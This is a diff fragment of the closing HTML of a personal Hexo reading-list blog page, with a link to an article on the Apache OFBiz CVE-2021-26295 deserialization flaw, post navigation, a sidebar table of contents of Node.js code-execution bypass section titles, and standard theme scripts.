+<p><a href="http://mp.weixin.qq.com/s?__biz=MzA5ODA0NDE2MA==&mid=2649743975&idx=1&sn=d733fe5c80ebe78a1f5fb19007bd4974&chksm=888cd208bffb5b1e1cbc29d8fe9dad73ab0ae293852c175dcf6842e9942dd0f8dbde2ece3bc3&scene=21#wechat_redirect" target="_blank" rel="noopener">【技术分享】CVE-2021-26295 Apache OFBiz 反序列化分析</a></p>
+<p><img src="https://mmbiz.qpic.cn/mmbiz_gif/Ok4fxxCpBb5ZMeq0JBK8AOH3CVMApDrPvnibHjxDDT1mY2ic8ABv6zWUDq0VxcQ128rL7lxiaQrE1oTmjqInO89xA/640?wx_fmt=gif" alt="">  </p>
+<hr>
+<p><strong>戳“阅读原文”查看更多内容</strong></p>
+
+    </div>
+
+    
+    
+    
+
+      <footer class="post-footer">
+          <div class="post-tags">
+              <a href="/tags/fetched/" rel="tag"># fetched</a>
+          </div>
+
+        
+
+
+        
+    <div class="post-nav">
+      <div class="post-nav-item">
+    <a href="/2021/04/26/qiwihui-pocket_readings-1085/" rel="prev" title="用树莓派打造一个超薄魔镜的简单教程">
+      <i class="fa fa-chevron-left"></i> 用树莓派打造一个超薄魔镜的简单教程
+    </a></div>
+      <div class="post-nav-item">
+    <a href="/2021/04/26/qiwihui-pocket_readings-1087/" rel="next" title="
+
+
+【技术分享】BlackHat：HTTP 请求走私的新变体、新防御 ">
+      
+
+
+【技术分享】BlackHat：HTTP 请求走私的新变体、新防御  <i class="fa fa-chevron-right"></i>
+    </a></div>
+    </div>
+      </footer>
+    
+  </article>
+  
+  
+  
+
+
+
+          </div>
+          
+
+<script>
+  window.addEventListener('tabs:register', () => {
+    let { activeClass } = CONFIG.comments;
+    if (CONFIG.comments.storage) {
+      activeClass = localStorage.getItem('comments_active') || activeClass;
+    }
+    if (activeClass) {
+      let activeTab = document.querySelector(`a[href="#comment-${activeClass}"]`);
+      if (activeTab) {
+        activeTab.click();
+      }
+    }
+  });
+  if (CONFIG.comments.storage) {
+    window.addEventListener('tabs:click', event => {
+      if (!event.target.matches('.tabs-comment .tab-content .tab-pane')) return;
+      let commentClass = event.target.classList[1];
+      localStorage.setItem('comments_active', commentClass);
+    });
+  }
+</script>
+
+        </div>
+          
+  
+  <div class="toggle sidebar-toggle">
+    <span class="toggle-line toggle-line-first"></span>
+    <span class="toggle-line toggle-line-middle"></span>
+    <span class="toggle-line toggle-line-last"></span>
+  </div>
+
+  <aside class="sidebar">
+    <div class="sidebar-inner">
+
+      <ul class="sidebar-nav motion-element">
+        <li class="sidebar-nav-toc">
+          Table of Contents
+        </li>
+        <li class="sidebar-nav-overview">
+          Overview
+        </li>
+      </ul>
+
+      <!--noindex-->
+      <div class="post-toc-wrap sidebar-panel">
+          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-3"><a class="nav-link" href="#Comments"><span class="nav-number">1.</span> <span class="nav-text">Comments</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#【技术分享】nodejs中代码执行绕过的一些技巧-by-安全客"><span class="nav-number"></span> <span class="nav-text">【技术分享】nodejs中代码执行绕过的一些技巧 by 安全客</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#"><span class="nav-number">1.</span> <span class="nav-text"></span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#2-1-16进制编码"><span class="nav-number">2.</span> <span class="nav-text">2.1 16进制编码</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#-1"><span class="nav-number">3.</span> <span class="nav-text"></span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#2-2-unicode编码"><span class="nav-number">4.</span> <span class="nav-text">2.2 unicode编码</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#2-3-加号拼接"><span class="nav-number">5.</span> <span class="nav-text">2.3 加号拼接</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#2-4-模板字符串"><span class="nav-number">6.</span> <span class="nav-text">2.4 模板字符串</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#-2"><span class="nav-number">7.</span> <span class="nav-text"></span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#2-5-concat连接"><span class="nav-number">8.</span> <span class="nav-text">2.5 concat连接</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#-3"><span class="nav-number">9.</span> <span class="nav-text"></span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#2-6-base64编码"><span class="nav-number">10.</span> <span class="nav-text">2.6 base64编码</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#-4"><span class="nav-number">11.</span> <span class="nav-text"></span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#3-1-Obejct-keys"><span class="nav-number">12.</span> <span class="nav-text">3.1 Obejct.keys</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#-5"><span class="nav-number">13.</span> <span class="nav-text"></span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#3-2-Reflect"><span class="nav-number">14.</span> <span class="nav-text">3.2 Reflect</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#-6"><span class="nav-number">15.</span> <span class="nav-text"></span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#3-3-过滤中括号的情况"><span class="nav-number">16.</span> <span class="nav-text">3.3 过滤中括号的情况</span></a></li></ol></div>
+      </div>
+      <!--/noindex-->
+
+      <div class="site-overview-wrap sidebar-panel">
+        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+  <p class="site-author-name" itemprop="name">qiwihui</p>
+  <div class="site-description" itemprop="description">个人阅读清单记录博客，并不代表个人观点。</div>
+</div>
+<div class="site-state-wrap motion-element">
+  <nav class="site-state">
+      <div class="site-state-item site-state-posts">
+          <a href="/archives/">
+        
+          <span class="site-state-item-count">144</span>
+          <span class="site-state-item-name">posts</span>
+        </a>
+      </div>
+      <div class="site-state-item site-state-categories">
+        <span class="site-state-item-count">1</span>
+        <span class="site-state-item-name">categories</span>
+      </div>
+      <div class="site-state-item site-state-tags">
+        <span class="site-state-item-count">1</span>
+        <span class="site-state-item-name">tags</span>
+      </div>
+  </nav>
+</div>
+
+
+
+      </div>
+
+    </div>
+  </aside>
+  <div id="sidebar-dimmer"></div>
+
+
+      </div>
+    </main>
+
+    <footer class="footer">
+      <div class="footer-inner">
+        
+
+        
+
+<div class="copyright">
+  
+  &copy; 
+  <span itemprop="copyrightYear">2021</span>
+  <span class="with-love">
+    <i class="fa fa-user"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">qiwihui</span>
+</div>
+  <div class="powered-by">Powered by <a href="https://hexo.io/" class="theme-link" rel="noopener" target="_blank">Hexo</a> & <a href="https://muse.theme-next.org/" class="theme-link" rel="noopener" target="_blank">NexT.Muse</a>
+  </div>
+
+        
+
+
+
+
+
+
+
+
+      </div>
+    </footer>
+  </div>
+
+  
+  <script src="/lib/anime.min.js"></script>
+  <script src="/lib/velocity/velocity.min.js"></script>
+  <script src="/lib/velocity/velocity.ui.min.js"></script>
+
+<script src="/js/utils.js"></script>
+
+<script src="/js/motion.js"></script>
+
+
+<script src="/js/schemes/muse.js"></script>
+
+
+<script src="/js/next-boot.js"></script>
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+  
+
+</body>
+</html>
